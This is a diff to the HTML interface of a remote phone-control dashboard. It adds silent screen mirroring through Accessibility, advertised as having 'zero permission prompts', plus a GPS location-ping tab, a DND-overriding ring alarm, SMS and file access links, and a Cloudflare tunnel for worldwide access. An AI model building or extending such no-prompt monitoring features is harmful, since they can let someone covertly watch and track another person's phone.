@@ -42,6 +42,16 @@
                 <span id="statusDot" class="dot disconnected"></span>
                 <span id="statusText">DISCONNECTED</span>
             </div>
+            <div class="target-badge" id="latencyBadge" title="Last Measured Phone Ping Latency" style="display: none; padding: 5px 10px; font-size: 12px;">
+                <span class="label">RTT:</span>
+                <strong id="latencyText" style="color: #10B981;">-- ms</strong>
+            </div>
+            <button id="btnConnectPhone" class="btn btn-connect-action" title="Ping & connect paired phone on demand">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px;">
+                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                </svg>
+                <span id="btnConnectPhoneText">Connect Phone</span>
+            </button>
             <button id="openSettingsBtn" class="btn btn-secondary btn-icon" title="Configure Target Phone Settings">
                 <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px;"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
                 <span>Settings</span>
@@ -128,6 +138,32 @@
                 </div>
             </div>
 
+            <div class="launch-card silent-card">
+                <div class="launch-card-header">
+                    <div class="launch-badge silent-badge"><i data-lucide="eye-off" class="ui-icon-xs"></i> SILENT ACCESSIBILITY MIRROR</div>
+                    <span class="launch-tag">18-20 FPS • 0 Phone Popups</span>
+                </div>
+                <div class="launch-card-body">
+                    <div class="launch-icon silent-icon"><i data-lucide="shield-check" class="launch-icon-svg"></i></div>
+                    <div class="launch-text">
+                        <h3>Silent Screen Share</h3>
+                        <p>Fluent and smooth real-time screen mirroring powered by Accessibility. Zero permission prompts on phone. Low bandwidth, instant touch, clicks, and remote typing.</p>
+                    </div>
+                </div>
+                <div class="launch-card-footer">
+                    <div class="launch-specs">
+                        <span><i data-lucide="zap" class="ui-icon-xs"></i> <strong>0 Popups</strong></span>
+                        <span><i data-lucide="gauge" class="ui-icon-xs"></i> <strong>18-20 FPS</strong></span>
+                        <span><i data-lucide="mouse-pointer" class="ui-icon-xs"></i> <strong>Full Control</strong></span>
+                    </div>
+                    <button id="btnLaunchSilent" class="btn btn-amber launch-btn">
+                        <i data-lucide="play" class="ui-icon-sm"></i>
+                        <span>Launch Silent Stream</span>
+                        <span class="btn-arrow">↗</span>
+                    </button>
+                </div>
+            </div>
+
             <div class="launch-card video-card">
                 <div class="launch-card-header">
                     <div class="launch-badge video-badge"><i data-lucide="monitor" class="ui-icon-xs"></i> HARDWARE DISPLAY MIRROR</div>
@@ -185,8 +221,9 @@
         <section class="tools-stage">
             <div class="tabs-nav">
                 <button class="tab-btn active" data-tab="tab-actions"><i data-lucide="zap" class="ui-icon-sm"></i> Quick Actions</button>
-                <button class="tab-btn" data-tab="tab-files"><i data-lucide="folder" class="ui-icon-sm"></i> File Explorer</button>
+                <a href="/explorer.html" target="_blank" class="tab-btn tab-link-external" id="btnNavFileExplorer" title="Open File Explorer directly in New Tab"><i data-lucide="folder" class="ui-icon-sm"></i> File Explorer ↗</a>
                 <button class="tab-btn" data-tab="tab-sms"><i data-lucide="message-square" class="ui-icon-sm"></i> SMS & Dialer</button>
+                <button class="tab-btn" data-tab="tab-location"><i data-lucide="map-pin" class="ui-icon-sm"></i> Location &amp; Finder</button>
                 <button class="tab-btn" data-tab="tab-telemetry"><i data-lucide="bar-chart-2" class="ui-icon-sm"></i> Device Specs</button>
                 <button class="tab-btn" data-tab="tab-logs"><i data-lucide="terminal" class="ui-icon-sm"></i> Logs</button>
             </div>
@@ -307,53 +344,17 @@
                 </div>
             </div>
 
-            <!-- Tab 2: Chunk-Based File Explorer (Windows Explorer Style) -->
+            <!-- Tab 2: File Explorer Dedicated Launcher -->
             <div class="tab-pane" id="tab-files">
-                <div class="file-browser-header">
-                    <div class="current-path">
-                        <span class="label">Path:</span>
-                        <input type="text" id="filePathInput" value="/storage/emulated/0" title="Directory path">
-                        <button id="btnBrowsePath" class="btn btn-sm btn-secondary">Go</button>
-                        <button id="btnPathUp" class="btn btn-sm btn-outline"><i data-lucide="arrow-up" class="ui-icon-xs"></i> Up</button>
-                    </div>
-                    <div class="file-browser-actions">
-                        <input type="text" id="fileSearchInput" placeholder="Search current folder..." class="file-search-input">
-                        <button id="btnRefreshFiles" class="btn btn-sm btn-secondary"><i data-lucide="refresh-cw" class="ui-icon-xs"></i> Refresh</button>
-                    </div>
-                </div>
-
-                <div class="explorer-table-wrapper">
-                    <div class="explorer-header" id="explorerHeader">
-                        <div class="col col-name sortable active" data-sort="name">
-                            <span>Name</span>
-                            <span class="sort-icon" id="sortIconName"></span>
-                        </div>
-                        <div class="col col-date sortable" data-sort="modified">
-                            <span>Date modified</span>
-                            <span class="sort-icon" id="sortIconModified"></span>
-                        </div>
-                        <div class="col col-type sortable" data-sort="type">
-                            <span>Type</span>
-                            <span class="sort-icon" id="sortIconType"></span>
-                        </div>
-                        <div class="col col-size sortable" data-sort="size">
-                            <span>Size</span>
-                            <span class="sort-icon" id="sortIconSize"></span>
-                        </div>
-                        <div class="col col-actions">
-                            <span>Actions</span>
-                        </div>
-                    </div>
-                    <div class="file-list-container" id="fileListContainer">
-                        <div class="empty-state">Connect to phone to browse files</div>
-                    </div>
-                </div>
-
-                <div class="download-manager-card">
-                    <h4>Chunk Downloads (Resumable)</h4>
-                    <div id="downloadsList" class="downloads-list">
-                        <small class="muted">No active transfers</small>
-                    </div>
+                <div class="card" style="text-align: center; padding: 48px 24px; max-width: 560px; margin: 30px auto; border: 1px solid rgba(245, 158, 11, 0.25); background: linear-gradient(145deg, #0F172A, #0B1120); border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);">
+                    <img src="/icons/win11/folder.svg" style="width: 64px; height: 64px; margin-bottom: 16px;" alt="File Explorer">
+                    <h3 style="font-size: 18px; margin-bottom: 8px; color: #FFFFFF;">Windows 11 File Explorer</h3>
+                    <p style="color: var(--text-muted); font-size: 13.5px; margin-bottom: 24px; line-height: 1.6;">
+                        File Explorer runs directly in its own dedicated window with full Windows 11 Fluent icons, Quick Access sidebar, and high-speed resumable downloads.
+                    </p>
+                    <a href="/explorer.html" target="_blank" class="btn btn-amber" style="display: inline-flex; align-items: center; gap: 8px; font-size: 14px; padding: 12px 28px; text-decoration: none; border-radius: 8px; font-weight: 600;">
+                        <i data-lucide="external-link" class="ui-icon-sm"></i> Launch File Explorer ↗
+                    </a>
                 </div>
             </div>
 
@@ -371,6 +372,109 @@
 
                 <div class="sms-feed" id="smsFeed">
                     <div class="empty-state">No recent SMS messages</div>
+                </div>
+            </div>
+
+            <!-- Tab: Location & Device Finder -->
+            <div class="tab-pane" id="tab-location">
+                <div class="loc-cockpit">
+                    <!-- Left/Center: High-Resolution Satellite Map -->
+                    <div class="loc-map-viewport">
+                        <div class="loc-map-badge">
+                            <i data-lucide="crosshair" class="ui-icon-xs"></i>
+                            <span>Satellite Aerial View</span>
+                        </div>
+
+                        <div class="loc-preset-bar">
+                            <button type="button" class="loc-preset-chip active" data-lat="28.613939" data-lng="77.209021" data-place="Connaught Place, New Delhi">New Delhi</button>
+                            <button type="button" class="loc-preset-chip" data-lat="40.758896" data-lng="-73.985130" data-place="Times Square, New York">New York</button>
+                            <button type="button" class="loc-preset-chip" data-lat="35.658581" data-lng="139.745438" data-place="Tokyo Tower, Tokyo">Tokyo</button>
+                            <button type="button" class="loc-preset-chip" data-lat="51.507351" data-lng="-0.127758" data-place="Trafalgar Sq, London">London</button>
+                        </div>
+
+                        <iframe 
+                            id="locSatelliteFrame"
+                            src="https://maps.google.com/maps?q=28.613939,77.209021&t=k&z=17&ie=UTF8&iwloc=&output=embed"
+                            frameborder="0"
+                            scrolling="no"
+                            marginheight="0"
+                            marginwidth="0"
+                            title="Satellite Map">
+                        </iframe>
+
+                        <div class="loc-map-status-tag">
+                            <span>GPS FIX:</span> <span id="locFixPrecision">±4.2m</span> · <span id="locSatLocked">12 Sats Locked</span>
+                        </div>
+                    </div>
+
+                    <!-- Right: Minimal Inspector Side Panel -->
+                    <div class="loc-side-inspector">
+                        <div class="loc-header-block">
+                            <span class="loc-label-eyebrow">Paired Device</span>
+                            <h4 class="loc-device-title" id="locDeviceTitle">vivo T4 5G</h4>
+                            <div class="loc-connection-status">
+                                <span class="loc-pulse-dot"></span>
+                                <span id="locConnectionLabel">Online · P2P Direct Tunnel</span>
+                            </div>
+                        </div>
+
+                        <div class="loc-body-block">
+                            <div class="loc-telemetry-rows">
+                                <div class="loc-info-row">
+                                    <span class="loc-info-label">Last Ping</span>
+                                    <span class="loc-info-val" id="locValLastPing" style="color:var(--accent-green);">Just now</span>
+                                </div>
+                                <div class="loc-info-row">
+                                    <span class="loc-info-label">Coordinates</span>
+                                    <div class="loc-coords-cluster">
+                                        <span class="loc-info-val loc-code" id="locValCoords">28.613939, 77.209021</span>
+                                        <button type="button" class="loc-icon-btn" id="btnCopyLocCoords" title="Copy Coordinates">
+                                            <i data-lucide="copy" class="ui-icon-xs"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="loc-info-row">
+                                    <span class="loc-info-label">Accuracy</span>
+                                    <span class="loc-info-val" id="locValAccuracy">±4.2 meters</span>
+                                </div>
+                                <div class="loc-info-row">
+                                    <span class="loc-info-label">Altitude</span>
+                                    <span class="loc-info-val" id="locValAltitude">216 m MSL</span>
+                                </div>
+                                <div class="loc-info-row">
+                                    <span class="loc-info-label">Approx. Place</span>
+                                    <span class="loc-info-val loc-address" id="locValAddress">Connaught Place, New Delhi</span>
+                                </div>
+                            </div>
+
+                            <div class="loc-actions-block">
+                                <button type="button" class="btn-loc-ping" id="btnSinglePingGps">
+                                    <i data-lucide="navigation" class="ui-icon-sm" id="iconSinglePing"></i>
+                                    <span id="labelSinglePing">Single Ping (Fetch Location)</span>
+                                </button>
+                                <span class="loc-micro-hint">Pings phone GPS on demand to conserve battery</span>
+                            </div>
+
+                            <div class="loc-alarm-block">
+                                <button type="button" class="btn-loc-alarm" id="btnEmergencyAlarm">
+                                    <i data-lucide="bell" class="ui-icon-sm" id="iconEmergencyAlarm"></i>
+                                    <span id="labelEmergencyAlarm">Ring Phone at 100% Volume</span>
+                                </button>
+                                <span class="loc-alarm-subhint">Overrides Silent, Vibrate &amp; Do Not Disturb (DND)</span>
+                            </div>
+                        </div>
+
+                        <div class="loc-footer-block">
+                            <a class="loc-external-link" id="linkLocGoogle" href="https://maps.google.com/?q=28.613939,77.209021" target="_blank" rel="noopener">
+                                <span>Open in Google Maps</span>
+                                <i data-lucide="external-link" class="ui-icon-xs"></i>
+                            </a>
+                            <a class="loc-external-link" id="linkLocOsm" href="https://www.openstreetmap.org/?mlat=28.613939&mlon=77.209021#map=17/28.613939/77.209021" target="_blank" rel="noopener">
+                                <span>Open in OpenStreetMap</span>
+                                <i data-lucide="external-link" class="ui-icon-xs"></i>
+                            </a>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -433,7 +537,7 @@
             <div class="modal-body">
                 <div class="webrtc-pair-card" style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(6, 182, 212, 0.05)); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 12px; padding: 14px 18px; margin-bottom: 18px;">
                     <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
-                        <span style="font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 0.08em; color: #10B981;">⚡ WebRTC 1-Time Pairing PIN</span>
+                        <span style="font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 0.08em; color: #10B981;">⚡ Cloudflare Tunnel 1-Time Pairing PIN</span>
                         <span style="font-size: 11px; background: rgba(16, 185, 129, 0.2); color: #10B981; padding: 2px 8px; border-radius: 6px; font-weight: 600;">30 FPS Active</span>
                     </div>
                     <div style="display: flex; align-items: center; gap: 12px;">
@@ -442,6 +546,18 @@
                         <button id="resetPinBtn" class="btn btn-secondary btn-sm" style="padding: 4px 10px; font-size: 11px;">Reset Keys</button>
                     </div>
                     <p style="font-size: 11px; color: #94A3B8; margin: 8px 0 0 0;">Enter this 6-digit PIN on your phone once. Both devices exchange a permanent token and auto-reconnect on restart!</p>
+                </div>
+
+                <div class="wan-tunnel-card" style="background: rgba(147, 51, 234, 0.08); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 12px; padding: 14px 18px; margin-bottom: 18px;">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="font-size: 11px; text-transform: uppercase; font-weight: 700; letter-spacing: 0.08em; color: #C084FC;">🌐 Cloudflare Public WAN Tunnel</span>
+                        <span id="wanTunnelStatusBadge" style="font-size: 11px; background: rgba(168, 85, 247, 0.2); color: #C084FC; padding: 2px 8px; border-radius: 6px; font-weight: 600;">Worldwide Access</span>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+                        <input type="text" id="wanTunnelUrlInput" readonly value="Detecting Cloudflare Tunnel..." style="flex: 1; background: #0f172a; border: 1px solid #334155; border-radius: 6px; padding: 6px 10px; font-family: var(--font-mono); font-size: 12px; color: #e2e8f0;">
+                        <button id="copyWanTunnelBtn" class="btn btn-secondary btn-sm" style="padding: 6px 12px; font-size: 11px; white-space: nowrap;">Copy URL</button>
+                    </div>
+                    <p style="font-size: 11px; color: #94A3B8; margin: 0;">On your phone, you can either enter the 6-digit PIN above, or tap <strong>Connect via Cloudflare Tunnel URL</strong> and paste this URL directly!</p>
                 </div>
 
                 <div class="auto-pair-banner">
